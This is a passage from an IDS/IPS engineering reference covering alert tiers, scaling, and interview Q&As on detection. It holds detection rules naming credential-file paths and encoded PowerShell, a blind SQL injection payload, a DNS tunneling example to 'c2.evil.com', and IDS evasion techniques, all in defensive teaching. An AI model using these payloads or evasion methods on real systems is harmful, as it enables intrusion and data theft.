- HIDS: privileged escalation on production host.
- 10× or more normal alert volume (possible cover-operation).
- Successful authentication to IPS management from unusual IP.

**Alert (next-business-day review):**
- Single SQL injection attempt from a single external IP (may be automated scanner).
- Low-severity anomaly from internal hosts.
- IPS rule false positive identified by analyst.

**Do NOT alert (suppress):**
- Internal vulnerability scanner IPs triggering IPS rules (suppress by source IP).
- Known-good monitoring tools generating protocol violations (e.g., custom health checks with malformed HTTP).
- Repeated alerts for the same source/destination/signature over 24 hours after initial alert is already open.

---

## 13. Scaling Considerations

### 13.1 Scaling Network IDS/IPS

The fundamental constraint: **the IPS must process every packet at line rate**. There is no queueing — a packet that can't be inspected in time is either dropped (with inspection) or passed (without inspection). Neither is good.

**Scaling dimensions:**

```
THROUGHPUT: Gbps of traffic to inspect
  └── Horizontal: more IPS nodes + load balancer / packet broker
  └── Vertical: faster CPUs, more cores, hardware acceleration (ASIC, FPGA)
  └── Bypass: route some traffic types around IPS (e.g., internal backup traffic)

CONNECTION RATE: New connections/second
  └── Flow table insertion rate limited by CPU (hash table operations)
  └── TCP SYN flood protection before IPS reduces this load

RULE COMPLEXITY: PCRE processing time per packet
  └── Reduce PCRE rules (replace with Aho-Corasick where possible)
  └── Use Hyperscan (Intel's SIMD-accelerated regex engine)
  └── Order rules to fail fast (most-specific first)

ALERT VOLUME: Alerts/second to SIEM
  └── Alert aggregation at sensor (dedup before sending)
  └── SIEM ingestion pipeline scaling (Kafka as buffer)
  └── Tiered alert storage (hot/warm/cold)
```

### 13.2 Packet Broker for Horizontal Scale

```
All network traffic
       │
       ▼
┌─────────────────────────────────────────────────────┐
│  Packet Broker (Gigamon, Ixia / Keysight, nGeniusONE)│
│  - Aggregates traffic from all TAP/SPAN sources      │
│  - De-duplicates (SPAN ports can generate duplicates)│
│  - Filters (e.g., send only HTTP to web-app IPS,     │
│             only DNS to DNS IDS)                     │
│  - Load-balances across sensor pool                  │
│    (consistent hashing: same 5-tuple → same sensor)  │
│  - Session-aware: keeps all packets of a TCP flow    │
│    on the same sensor (needed for reassembly)        │
└─────────────────────────────────────────────────────┘
       │         │         │
       ▼         ▼         ▼
  IPS Sensor1  IPS Sensor2  IPS Sensor3
  (HTTP/HTTPS) (DNS/SMTP)  (Internal East-West)
```

### 13.3 Bottlenecks at Scale

**Reassembly buffer (most common real-world bottleneck):**
- Every TCP flow needs a reassembly buffer until it's closed or times out.
- 100,000 concurrent flows × 512KB reassembly buffer = 51GB RAM needed.
- Solution: reduce reassembly timeout aggressively; cap per-flow buffer size; prioritize reassembly for flows matching fast patterns.

**PCRE processing (most common performance disaster):**
- A rule with a badly written PCRE can consume 100% of a CPU core for a single packet.
- Solution: pre-qualify with fast content match before invoking PCRE. Use RE2 or Hyperscan for linear-time regex. Set PCRE match limits and time limits.

**Alert delivery pipeline:**
- 50,000 alerts/second from sensors → log shipper → SIEM.
- Direct TCP/TLS shipping can't keep up.
- Solution: Kafka as a buffer between sensor and SIEM. Sensors publish to Kafka; SIEM consumes from Kafka. Kafka handles backpressure; no alert loss if SIEM is temporarily slow.

### 13.4 Consistency Tradeoffs in Distributed IPS

**State synchronization in active-active HA:**
- Two inline IPS nodes in active-active mode both process packets.
- TCP reassembly requires per-flow state. Flow A starts on Node 1 (SYN, SYN-ACK), subsequent packets on Node 2 (data). Node 2 has no reassembly state for this flow.
- Solution: session synchronization protocol between HA nodes (heartbeat + state replication). Or: consistent hashing at the load balancer to ensure flow affinity (all packets of a flow go to the same node).

**Fail-open vs. fail-closed:**
- Fail-open: if the IPS crashes, bypass relay activates, traffic passes without inspection.
  → Availability: high. Security: zero during failure.
- Fail-closed: if the IPS crashes, traffic is blocked.
  → Security: high (no unmonitored traffic). Availability: zero during failure (network outage).
- Most production deployments use fail-open because network outages are more immediately painful than uninspected traffic for the duration of a maintenance window.

**Detection delay in distributed deployments:**
- In a large distributed deployment (sensors at 20 data centers), each sensor generates alerts independently.
- SIEM correlation across sensors requires log aggregation. An attacker can spread their activity across multiple sensor zones to avoid any single sensor triggering a high-confidence alert.
- Solution: SIEM-level correlation across sensor sources; global IP reputation tracking; centralized behavioral analytics that aggregate signals across all sensors.

---

## 14. Interview Questions

### Q1: Explain the difference between IDS and IPS. What changes architecturally and operationally when you switch from IDS to IPS mode?

**Answer:**

IDS (Intrusion Detection System) operates in **passive mode** — it receives a copy of network traffic (via a network TAP or switch SPAN port). The original traffic flows directly to the destination, uninterrupted. The IDS processes the copy, generates alerts, and sends them to a SIEM. It cannot block anything. Latency added to production traffic: zero.

IPS (Intrusion Prevention System) operates in **inline mode** — it physically sits in the traffic path. Every packet passes through the IPS before reaching the destination. The IPS can PASS, DROP, REJECT (send TCP RST), or MODIFY packets. Latency added: 0.1–10ms per packet/flow, depending on inspection depth.

**Architectural changes:**
- IDS: passive NIC (promiscuous mode) or optical TAP. No network reconfiguration needed.
- IPS: inline network insertion (bump-in-the-wire). Requires recabling, bypass relays for HA, and careful placement in the network topology.

**Operational changes:**
- IDS: false positives are annoying but harmless (SOC analyst investigates a false alert).
- IPS: false positives cause **service disruption** — legitimate traffic is blocked. This raises the bar for confidence before enabling blocking mode. Tuning becomes safety-critical, not just noise-reduction.
- IPS fail mode: IDS failure just means missed alerts. IPS failure means network outage (fail-closed) or uninspected traffic (fail-open). Most orgs use fail-open to preserve availability.

**What if you could only choose one?** Start with IDS to build visibility without risk. Tune rules to low false-positive rates. Only switch to IPS mode once you're confident in the rule set. Use IPS only for highest-confidence signatures (known exploit payloads, shellcode).

---

### Q2: How does TCP stream reassembly work in an IDS, and what are the evasion implications of getting it wrong?

**Answer:**

TCP delivers a byte stream, not messages. A single HTTP request may be split across many TCP segments, arriving out of order. The IDS must reassemble the full stream before applying application-layer signatures.

**Mechanics:**
1. IDS maintains a per-flow buffer keyed on the TCP 5-tuple.
2. Incoming segments are placed at their correct byte offset based on sequence number.
3. Gaps (missing segments) cause the buffer to hold until the gap is filled or a timeout occurs.
4. Once a gap is filled (or a complete application message is detected), the reassembled buffer is passed to the protocol parser and then the rule engine.

**Evasion via reassembly:**
1. **Insertion attack:** Attacker sends a packet that the IDS processes but the target OS rejects (e.g., TTL=1 — packet expires before reaching the server, but IDS with a longer-lived view processes it). The IDS sees the "inserted" bytes; the target doesn't. The reassembled stream in the IDS is different from what the target actually received — the IDS may conclude a benign sequence while the target received a malicious one.

2. **Evasion attack:** Attacker sends overlapping TCP segments. Segment A (seq 100–110): `OR 1=1 -` (benign-looking). Segment B (seq 105–115): `5==5 --`. If the IDS picks Segment A's bytes 105–110 and the target OS picks Segment B's bytes 105–110, they construct different streams. The IDS sees the benign version; the target sees the malicious one.

3. **Mitigation:** IPS must normalize the TCP stream to match the target OS's behavior exactly. This means knowing how the target OS handles overlaps (Linux kernel behavior vs. Windows behavior for the same ambiguous case). OS fingerprinting (from SYN/SYN-ACK) can inform the IPS which OS normalization to apply.

**What if reassembly memory is exhausted?** The IDS must make a choice: inspect the fragment alone (incomplete — evasion possible), or drop (alert but don't inspect — possible false negative). Correct answer: alert and inspect what you have, but flag it as "incomplete reassembly."

---

### Q3: What is JA3/JA3S fingerprinting? How is it used in IDS, and what are its limitations?

**Answer:**

JA3 is a method of fingerprinting TLS clients by hashing specific fields from the TLS `ClientHello` message:
- TLS version
- Cipher suite list (in order)
- List of extensions
- Elliptic curve list
- Elliptic curve point formats

These fields are concatenated in a specific order and MD5-hashed. The result is a 32-character hex string — the JA3 hash.

JA3S (server-side) fingerprints the TLS `ServerHello` response fields similarly.

**Why this is useful for IDS:**
- Malware families tend to use the same TLS library (e.g., Python's ssl module, Go's crypto/tls). Different TLS libraries produce distinctly different JA3 hashes.
- A database of known-bad JA3 hashes (e.g., from Cobalt Strike, Metasploit, known malware) allows the IDS to flag connections even without decrypting the payload.
- Example: Cobalt Strike's default JA3 hash (`72a589da586844d7f0818ce684948eea`) became so well-known that defenders started blocking it. Attackers now configure custom JA3 hashes.

**Limitations:**
1. **Collision:** Many legitimate clients share the same JA3 hash. Chrome, Firefox, and some malware may hash to the same value. High false positive rate if used as the sole indicator.
2. **Trivial evasion:** An attacker can reorder cipher suites or add/remove extensions in their TLS library to change the JA3 hash. This takes minutes of effort.
3. **Evolution:** As browsers update their TLS implementations, JA3 hashes change. What was a benign hash 6 months ago may now be a malware hash, or vice versa.
4. **Best used as enrichment, not blocking.** JA3 should be a signal that increases alert priority when combined with other indicators — not a standalone blocking criterion.

---

### Q4: How do you detect DNS tunneling? Explain both the mechanics of the attack and the detection algorithm.

**Answer:**

**DNS tunneling mechanics:**
DNS is a request-response protocol over UDP/53 or TCP/53. A DNS query can contain a 253-character hostname and receive a TXT record with up to 65,535 bytes. An attacker who controls an authoritative nameserver for a domain can encode arbitrary data in both the query (subdomain) and the response (TXT/CNAME/MX records).

For C2: malware sends commands encoded in TXT record responses. Malware sends data-exfiltration payloads encoded as the subdomain of DNS queries.

Example: Attacker wants to send the string "execute:id" to the malware. They encode it:
- Base32 encode "execute:id" → `MNQXIYLTNFXGOIDB`
- Malware polls: `MNQXIYLTNFXGOIDB.c2.evil.com TXT?`
- Authoritative NS for evil.com (attacker-controlled) responds with the next encoded command.

**Detection algorithm:**

*Entropy analysis:*
- Legitimate domains: `mail.google.com`, `api.stripe.com` — low entropy, human-readable.
- DNS tunnel subdomain: `MNQXIYLTNFXGOIDB.c2.evil.com` — high entropy (close to random).
- Shannon entropy formula: H = -Σ(p(x) * log2(p(x))) for each character.
- Threshold: subdomain entropy > 3.5 bits/character → suspicious (pure English text ~4.0; base64 ~6.0; base32 ~4.7).

*Volume analysis:*
- Legitimate user: 50–200 DNS queries/hour, mostly to well-known domains.
- DNS tunnel: hundreds of queries to the same apex domain (one per tunneled message), or thousands for high-bandwidth exfiltration.
- Alert: single host > 100 unique subdomain queries to same apex domain in 5 minutes.

*Query type analysis:*
- DNS tunneling often uses TXT queries (for responses) and A/AAAA queries with high-entropy subdomains (for data encoding).
- Anomaly: unusually high ratio of TXT queries from an internal host.

*NXDOMAIN rate:*
- DGA malware generates many random domain names; most don't exist → high NXDOMAIN rate.
- Alert: single host > 30% NXDOMAIN rate over 100 queries.

*Payload length analysis:*
- Normal A record response: 4 bytes (IPv4 address).
- DNS tunnel response (TXT): maximum 512 bytes per UDP response, 65535 bytes per TCP response.
- Alert: TXT responses > 200 bytes from domains with suspicious reputation or recent registration.

---

### Q5: Describe the IPS policy evaluation hierarchy. If a `pass` rule and an `alert` rule both match the same packet, which takes precedence? Why?

**Answer:**

In Suricata and Snort, rules are evaluated in a **priority order** based on the action type, not just rule order within a file.

**Suricata action priority (highest to lowest):**
1. **`pass`**: If a pass rule matches, the packet is allowed through immediately and no further rules are evaluated. Pass rules are evaluated first.
2. **`drop`** (IPS mode): Packet is dropped, flow is reset. Alert is generated.
3. **`reject`**: TCP RST sent to both sides, packet dropped.
4. **`alert`**: Alert generated, packet forwarded.

So if a `pass` rule and an `alert` rule both match the same packet, the **`pass` rule wins** — the packet is allowed through and no alert is generated.

**Why this design?**
Pass rules exist precisely for whitelisting. Example:
- You have an IDS rule that fires on `sqlmap` user-agent strings.
- Your internal security team runs sqlmap as part of penetration testing, from a known IP `10.0.0.10`.
- You create: `pass http 10.0.0.10 any -> any any (msg:"Allow internal scanner"; http_user_agent; content:"sqlmap"; sid:9000001;)`
- Now sqlmap from `10.0.0.10` generates no alerts; sqlmap from any other IP still alerts.

**The danger:** If a pass rule is too broad, it can silently suppress real attack alerts. Pass rules should be as specific as possible (narrow source IP, specific destination, specific port).

**What if you want an alert but no block for specific traffic?** Use `alert` action instead of `drop`. In Snort terms, the `alert` action generates an alert AND passes the packet. The `drop` action is what blocks. So `alert` + `drop` as separate rules for the same signature would generate an alert and still block (the drop takes higher priority than alert action). Use `alert`-only rules for visibility without prevention.

---

### Q6: How does an IPS handle a TLS connection with certificate pinning? What breaks, and why?

**Answer:**

Certificate pinning is a mechanism where an application (typically a mobile app or desktop client) hardcodes or remembers the expected certificate (or certificate hash/public key hash) for a specific server. Instead of trusting any certificate signed by any CA in the OS root store, the application only trusts the one specific certificate it expects.

**What happens during TLS inspection with certificate pinning:**

1. The TLS inspection IPS performs a man-in-the-middle: it presents its own certificate (signed by the IPS's CA) to the client instead of the server's real certificate.
2. A regular browser trusts the IPS CA (it was pushed via GPO/MDM) → TLS inspection succeeds.
3. An application with certificate pinning compares the received certificate to its pinned value. The IPS's certificate is not the expected one. The application throws a certificate validation error and refuses the connection.
4. The connection fails entirely — the application cannot reach its server.

**Types of pinning:**
- **Certificate pinning:** Exact match on the full certificate. Most strict. Breaks immediately on any certificate change (even legitimate renewal).
- **Public key pinning:** Match on the public key hash embedded in the certificate. More flexible — the certificate can be renewed as long as the same key pair is used.
- **CA pinning:** Only trust certificates from a specific CA. Less strict — any cert from that CA works.

**IPS handling:**
- The IPS should maintain a **bypass list** of applications/domains known to use certificate pinning: banking apps, healthcare apps, enterprise software.
- Traffic to these domains/IPs is excluded from TLS inspection — it passes through uninspected.
- This creates a blind spot: any malware that uses certificate pinning or routes through a pinned domain will bypass TLS inspection.

**The emerging problem — ECH (Encrypted Client Hello):**
Even the SNI field (which tells the IPS the destination hostname for bypass decisions) is being encrypted in TLS 1.3's Encrypted Client Hello extension. When ECH is widely deployed, the IPS cannot even read the hostname to make a bypass decision — it must make TLS interception decisions purely on IP address, losing the hostname context entirely.

---

### Q7: You're a security architect. Your organization processes 100 Gbps of network traffic. How do you architect the IPS layer to handle this without being a single point of failure?

**Answer:**

At 100 Gbps, no single IPS appliance or software instance can inspect all traffic in software without packet drops. The architecture must distribute load while maintaining correctness (no flows split across sensors losing reassembly context) and availability (no single point of failure creating a total network outage or blind spot).

**Architecture:**

```
Tier 1: Hardware Traffic Distribution
  100G uplink arrives at core switch.
  Switch mirrors traffic to a packet broker cluster.
  Packet broker functions:
  - Aggregate traffic from multiple TAP/SPAN sources.
  - De-duplicate.
  - Filter: strip encrypted backup traffic, bulk file transfers 
    that don't need deep inspection (reduces load by 40-60%).
  - Session-aware load balancing: consistent hash(5-tuple) 
    distributes flows across sensor pool. All packets of a flow 
    always go to the same sensor (preserves reassembly state).

Tier 2: Sensor Pool (horizontal scale)
  Pool of N sensors (size N based on inspectable throughput per sensor).
  At 10 Gbps inspectable per sensor: 10 sensors for 100 Gbps.
  Each sensor runs Suricata with DPDK (kernel-bypass for high-throughput).
  Intel Hyperscan as the regex engine (SIMD-accelerated, linear time).
  Each sensor is stateless from the HA perspective (the packet broker 
  ensures flow affinity, so each sensor fully handles its assigned flows).

Tier 3: High Availability
  For inline IPS mode:
  - Sensor pairs (active-active or active-standby).
  - Bypass relay (network TAP with bypass mode): if a sensor loses 
    power or crashes, the bypass relay closes, connecting the network 
    cables directly (fail-open). Traffic flows unmonitored during 
    failover, but the network stays up.
  - Health check: the packet broker continuously verifies sensor 
    health. On failure: rebalances load to remaining sensors.

Tier 4: Alert Pipeline
  All sensors publish alerts to a Kafka cluster.
  Kafka provides backpressure buffering: sensors can burst to 1M 
  alerts/sec without losing events (consumers catch up later).
  SIEM cluster consumes from Kafka: Elasticsearch with 
  hot/warm/cold tiering for 90-day retention.
```

**For 100 Gbps with TLS inspection:** TLS inspection is 10× more compute-intensive. You would need 100 sensor instances for full TLS inspection at 100 Gbps. At that scale, hardware TLS offload cards (Intel QAT, Marvell NITROX) or dedicated TLS proxy hardware become necessary. Alternatively, selectively inspect only traffic to web application servers (reduce inspection scope to highest-value targets).

---

### Q8: What is the difference between a NIDS signature, a YARA rule, and a SIGMA rule? In what context is each used?

**Answer:**

These three rule formats operate at different points in the security stack:

**NIDS signature (Snort/Suricata rule format):**
- **Purpose:** Detect attacks in live network traffic.
- **Operates on:** Raw network packets, reassembled TCP streams, decoded protocol data.
- **Timing:** Real-time, in the data path.
- **Granularity:** Packet fields, protocol headers, payload content, flow state.
- **Example:** `alert http any any -> any any (content:"../../../etc/passwd"; http_uri; msg:"Path Traversal"; sid:1001;)`
- **Limitation:** Only sees network traffic. Cannot inspect file contents, process behavior, or system state.

**YARA rule:**
- **Purpose:** Detect malware by matching patterns in files or process memory.
- **Operates on:** File contents (bytes), process memory regions.
- **Timing:** Batch (file scanning), triggered on file creation (HIDS integration), on-demand (IR investigation).
- **Granularity:** Byte patterns, strings, hex sequences, regular expressions, file metadata, cross-section conditions.
- **Example:**
  ```yara
  rule CobaltStrike_Beacon {
    meta: author = "Analyst1"
    strings:
      $magic = { 4D 5A 90 00 }  // MZ header
      $cobalt = "License and Copyright" ascii
      $config = { 69 68 69 68 69 6B }  // Known CS config marker
    condition:
      $magic at 0 and $cobalt and $config
  }
  ```
- **Limitation:** Doesn't see network traffic. Used for post-compromise forensics, EDR scanning, malware analysis.

**SIGMA rule:**
- **Purpose:** Detect attacks by matching patterns in log events (SIEM detection).
- **Operates on:** Structured log data in a SIEM (event logs, access logs, authentication logs, process logs).
- **Timing:** Near-real-time in SIEM (seconds to minutes after log ingestion), or retroactive (hunting over historical logs).
- **Granularity:** Log field values, process names, parent-child relationships, command-line arguments.
- **Example:**
  ```yaml
  title: Suspicious PowerShell Execution
  logsource:
    product: windows
    service: security
  detection:
    selection:
      EventID: 4688
      NewProcessName|contains: 'powershell.exe'
      CommandLine|contains:
        - '-EncodedCommand'
        - '-enc'
        - 'IEX'
    condition: selection
  ```
- **Unique value:** SIGMA is platform-agnostic — rules are converted to Splunk SPL, Elasticsearch KQL, Sentinel KQL, etc. Write once, deploy anywhere.
- **Limitation:** Requires logs to exist. If logging is incomplete or logging was disabled by the attacker, SIGMA rules miss events.

**How they complement each other:**
```
Network IDS rule → detects the initial exploit attempt at the network layer
      ↓ (attack succeeds, malware installed)
YARA rule → detects the malware binary on disk or in memory (EDR/AV)
      ↓ (malware executes, creates logs)
SIGMA rule → detects the malicious behavior in Windows event logs / SIEM
```

---

### Q9: An attacker is using low-and-slow SQL injection — 1 request per 30 seconds — to extract your database. Your IPS hasn't fired. Walk through every layer of detection that could catch this.

**Answer:**

This is a multi-layer detection problem. The attacker is staying below every individual threshold but leaves traces across multiple layers.

**Layer 1: Network IPS (probably misses this)**
- Rate: 2 req/min. Rate-based rules don't fire (threshold typically 100/min).
- The SQL payload `IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)` may not match classic SQLi signatures (no `OR`, no `UNION SELECT`).
- IF/SLEEP patterns: Suricata ET rule `2006445` covers basic injection. A specific rule for `SLEEP()` in MySQL context: `content:"SLEEP("; http_uri; pcre:"/SLEEP\s*\(\s*\d+\s*\)/Ui";` — check whether this rule is enabled.

**Layer 2: WAF (application-layer, better context)**
- The WAF understands the application's URL structure and parameter definitions.
- `id` is supposed to be an integer (1, 2, 3...). The value `1;IF(SUBSTRING(...)...)` contains `;`, `(`, `)`, `'` — characters that shouldn't appear in an integer parameter.
- WAF positive security model: `id` matches the pattern `\d+` → any deviation is flagged. This stops the attack at the WAF.

**Layer 3: Application performance monitoring**
- Some requests to `/products?id=...` respond in 50ms (normal). Some respond in 5050ms (SLEEP(5) fired).
- APM detects the bimodal response time distribution for this endpoint. Alert: "Endpoint /products experiencing intermittent 5-second delays inconsistent with backend DB load."

**Layer 4: Database query logging**
- Enable MySQL slow query log with threshold = 1 second. Any query taking > 1s is logged.
- `SELECT ... WHERE id = 1 IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) --` → appears in slow query log when the sleep fires.
- Database-level IDS (Imperva DAM): every query logged; `SLEEP()` in a query triggers immediate alert.

**Layer 5: HTTP access log pattern analysis (SIEM retroactive)**
- Access log: 1,900 requests to `/products` over 15 hours from the same IP.
- Average inter-request interval: exactly 30 seconds. No human browses with that regularity.
- SIEM correlation rule: "Same source IP, same endpoint, > 1000 requests, interval variance < 5s" → beacon detection, adapted for HTTP.

**Layer 6: Database response time correlation with external factors**
- Database monitoring: query execution times have periodic 5-second spikes.
- Correlated with web access log: the spikes correspond to requests where the `id` parameter is unusually long (contains function calls).
- This cross-layer correlation is what a threat hunter would look for.

**The lesson:** No single layer catches this alone. The defense is depth: WAF for the immediate stop; application monitoring and DB logging for detection; log analysis for retrospective confirmation.

---

### Q10: How does an IDS detect network reconnaissance (port scanning) and what are the evasion techniques an attacker would use?

**Answer:**

**Port scan detection mechanics:**

A port scanner (nmap default scan) sends TCP SYN packets to many ports on a target and observes whether they're open (SYN-ACK received), closed (RST received), or filtered (no response).

IDS port scan detection rules watch for:
1. **Horizontal scan:** One source IP sends SYN packets to many destination ports on one host in a short time window (e.g., 100 SYNs to different ports in 10 seconds = port scan).
2. **Vertical scan:** One source IP sends SYN packets to the same port on many destination IPs (e.g., SYN to port 22 on 1,000 IPs = SSH scanner).
3. **Stealthy scan signatures:** SYN without ACK (half-open scan), FIN/NULL/XMAS scans (unusual TCP flag combinations), UDP probes.

**Suricata detection logic:**
```
# Port scan detection (sfportscan preprocessor in Snort / thresholding in Suricata):
alert tcp any any -> any any (
  flags:S,12;         # SYN only (not SYN+ACK)
  flow:stateless;     # Don't require established connection
  detection_filter:   # Threshold
    track by_src,
    count 100,
    seconds 10;
  msg:"Possible Port Scan";
  sid:5000001;
)
```

**Evasion techniques:**

1. **Slow scan (temporal evasion):** Spread the scan over hours or days. At 1 port per 10 seconds, scanning 1,000 ports takes ~3 hours. Rate-based thresholds (100 SYN in 10 seconds) don't fire. Detection requires long-window tracking.

2. **Distributed scan (spatial evasion):** Use 100 different source IPs (botnet). Each IP scans only 10 ports. No single IP triggers the per-source rate threshold. Detection requires correlating across source IPs.

3. **Using legitimate traffic patterns:** Instead of raw SYN packets, open full HTTP connections to each port. This looks like legitimate web browsing to the IDS. Some IDS products detect this via "incomplete connection rate" (many connections opened and closed without data exchange).

4. **Decoy scanning:** Nmap's `-D` flag sends the real scan SYN interleaved with spoofed SYNs from random IPs. The IDS sees many IPs scanning, not just one. Analyst has trouble identifying the real attacker's IP.

5. **Fragmented SYN:** Send the SYN packet fragmented across multiple IP fragments. Some IDS reassemble IP fragments before inspection; others don't. A non-reassembling IDS never sees a complete SYN packet.

6. **TTL evasion:** Set TTL just low enough to reach the target host but not the IDS (if IDS is further away). The IDS doesn't see the packet at all.

**Modern detection (behavioral/ML):**
Threshold-based scan detection is easily evaded. Modern detection uses ML to establish a baseline of connection patterns per source IP and flag anomalies. A host that establishes connections to 200 unique destinations in a day (when its baseline is 10/day) is flagged, regardless of the rate of each individual connection.

---

### Q11: What is the MITRE ATT&CK framework and how does it inform IDS/IPS rule development and SOC operations?

**Answer:**

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a structured knowledge base of real-world attacker behaviors, organized into a matrix of:
- **Tactics** (14): The attacker's goal at a phase of the attack (Reconnaissance, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact).
- **Techniques** (hundreds): Specific methods used to achieve each tactic (e.g., T1190: Exploit Public-Facing Application; T1059.001: PowerShell; T1071.004: DNS C2).
- **Sub-techniques:** More specific variants of techniques.
- **Procedures:** Real-world examples of APT groups using each technique.

**How it informs IDS/IPS rule development:**

1. **Coverage mapping:** Map each IDS rule to the ATT&CK technique it detects. Identify which techniques have no detection coverage.
   ```
   T1190 (Exploit Public-Facing) → covered by SQLi/RCE IPS signatures ✓
   T1071.004 (DNS C2) → covered by DNS entropy analysis ✓
   T1027 (Obfuscated Files) → NOT covered ✗
   T1055 (Process Injection) → HIDS kernel module required ✗
   ```

2. **Prioritization:** Not all ATT&CK techniques are equally likely for your threat model. Map known adversaries (APTs targeting your industry) to their frequently used techniques. Prioritize detection coverage for those techniques.

3. **Rule naming convention:** Name IDS rules by ATT&CK technique ID. `ET ATTACK_RESPONSE T1190 SQL Injection` is more useful in a SOC than `Generic SQL Injection Alert`.

**How it informs SOC operations:**

1. **Alert triage:** When an alert fires, the ATT&CK mapping tells the analyst what phase of the attack lifecycle it represents. A T1190 (Initial Access) alert is the beginning of a potential attack chain. A T1048 (Exfiltration) alert means the attacker may have already succeeded in their objective.

2. **Correlation:** If the SOC sees T1190 (Initial Access) → T1059 (Execution) → T1071 (C2) in sequence from the same host, this is a complete attack chain — automatic escalation to critical.

3. **Threat hunting:** "We have no detection for T1027 (Obfuscation). Let me write a SIGMA rule for common obfuscation patterns in PowerShell and hunt retroactively over the last 30 days."

4. **Red team planning:** Red team uses ATT&CK to design realistic attack simulations. Blue team uses the same framework to measure whether their detections fire. The shared language eliminates ambiguity.

---

### Q12: Your SIEM is receiving alerts from 10 IDS sensors. An attacker is performing a coordinated attack, triggering exactly 1 alert per sensor (below each sensor's correlation threshold). How would you architect cross-sensor correlation, and what are the technical challenges?

**Answer:**

**The problem in detail:** Each sensor has a threshold of N events/minute from the same source before generating a high-priority alert. The attacker sends traffic to 10 sensors, with 1 event per sensor — below the per-sensor threshold. In aggregate, it's 10 events total, which is above a logical threshold — but no individual sensor knows about the others.

**Architecture for cross-sensor correlation:**

```
Each sensor generates: 
  {timestamp, src_ip, signature_id, sensor_id, event_type}

All events flow to SIEM (Kafka → Elasticsearch).

SIEM correlation query (runs every 60 seconds):
SELECT 
  src_ip,
  COUNT(DISTINCT sensor_id) AS sensor_count,
  COUNT(*) AS event_count,
  ARRAY_AGG(DISTINCT signature_id) AS signatures
FROM security_events
WHERE timestamp > NOW() - INTERVAL '10 minutes'
  AND event_type = 'alert'
GROUP BY src_ip
HAVING COUNT(DISTINCT sensor_id) >= 3  
   AND COUNT(*) >= 5;
```

This query finds source IPs that have triggered alerts on 3+ distinct sensors with 5+ total events in the last 10 minutes — regardless of per-sensor thresholds.

**Technical challenges:**

1. **Clock skew:** Events from different sensors may have slightly different timestamps (NTP divergence up to ±1 second). A 10-minute window correlation must account for clock skew. Use NTP stratum 2 or better on all sensors; add a 30-second buffer to correlation windows.

2. **IP spoofing:** The attacker may use different source IPs on different sensors to evade cross-sensor correlation. Mitigation: correlate on ASN, /24 prefix, geographic region, or behavioral patterns rather than exact IP.

3. **Schema normalization:** 10 sensors may use different log formats (CEF, EVE JSON, Snort unified2). Before correlation, normalize to a common schema (OCSF or ECS). Field names must be consistent: `src_ip` not `source_address` or `client_ip`.

4. **Correlation engine performance:** Running a GROUP BY query across 10 sensors' combined 1M events/minute requires an efficient SIEM backend. Elasticsearch with pre-aggregated time-series data (ECS rollups) or Splunk's `stats` command on a distributed search head cluster can handle this.

5. **Alert deduplication:** The cross-sensor correlation generates an aggregated alert. The individual per-sensor alerts also exist. The SOC would see 10 low-priority individual alerts + 1 high-priority aggregated alert. The SIEM must link them (via `related_alerts` field) and suppress the individual alerts once the aggregated alert exists.

6. **Latency:** Cross-sensor correlation has inherent latency equal to the correlation window (10 minutes in the example). If the attacker completes their objective in 9 minutes, the correlation alert arrives after the fact. Reduce the window (at the cost of more false positives) or complement with real-time per-sensor detection for the most critical signatures.

---

*End of document. This breakdown represents a production-grade IDS/IPS engineering and security reference at the level expected of a senior security engineer or SOC architect.*
